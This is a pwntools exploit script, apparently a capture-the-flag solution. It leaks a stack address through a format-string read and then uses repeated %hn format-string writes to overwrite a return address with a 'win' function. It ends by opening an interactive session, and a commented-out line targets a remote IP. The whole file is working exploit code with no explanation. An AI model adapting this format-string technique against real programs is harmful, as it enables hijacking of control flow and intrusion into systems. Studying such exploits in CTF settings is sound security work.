from pwn import *
context.log_level = "debug"
#p=remote('47.109.135.169',20014)
#p=process('./pp')
p=remote('127.0.0.1',9999)
elf=ELF('./pwn')

p.recvuntil('Your story:\n')
payload='%6$p'
p.sendline(payload)
p.recvuntil('0x')
addr=int(p.recv(12),16)
print hex(addr)
rsp=addr-0xf0
ret=rsp+0x18
win=0x4007a7

'''
%11$p->%37$p->
'''
p.recvuntil(':')
payload=b'%' + str(int(hex(ret)[-4:], 16)).encode() + b'c%11$hn\x00'
p.sendline(payload)
p.recvuntil(':')
payload=b'%' + str(int(hex(win)[-4:], 16)).encode() + b'c%37$hn\x00'
p.sendline(payload)
p.recvuntil(':')
payload=b'%' + str(int(hex(ret+2)[-4:], 16)).encode() + b'c%11$hn\x00'
p.sendline(payload)
p.recvuntil(':')
payload=b'%' + str(int(hex(win)[-8:-4], 16)).encode() + b'c%37$hn\x00'
p.sendline(payload)
p.recvuntil(':')
payload=b'%' + str(int(hex(ret+4)[-4:], 16)).encode() + b'c%11$hn\x00'
p.sendline(payload)

p.recvuntil(':')
payload=b'%37$n\x00'
p.sendline(payload)
#gdb.attach(p)

for i in range(13):
   p.recvuntil(':')
   p.sendline('1')

p.interactive()


